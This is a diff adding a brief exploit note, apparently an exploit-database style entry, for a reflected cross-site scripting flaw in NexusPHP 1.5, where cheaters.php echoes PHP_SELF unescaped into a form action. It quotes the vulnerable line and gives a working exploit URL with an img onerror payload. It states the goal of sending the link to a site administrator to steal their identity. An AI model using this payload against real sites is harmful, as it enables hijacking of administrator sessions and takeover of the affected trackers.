@@ -1,0 +1,17 @@
+# by 张宇航
+
+'''
+	Send URL to the web administrator to complete the attack,get the administrator's identity
+
+	Source:
+		cheaters.php:27
+			echo '<center><form method="get" action="'.$_SERVER["PHP_SELF"].'">';
+	Affected software: NexusPHP 1.5
+	Software Link: http://sourceforge.net/projects/nexusphp/
+
+	Free to modify and redistribute this program.
+	Use at your own risk and you are responsible for what you are doing.
+'''
+
+exploit:
+	http://localhost/cheaters.php/"><img src=1 onerror=alert(1)>/
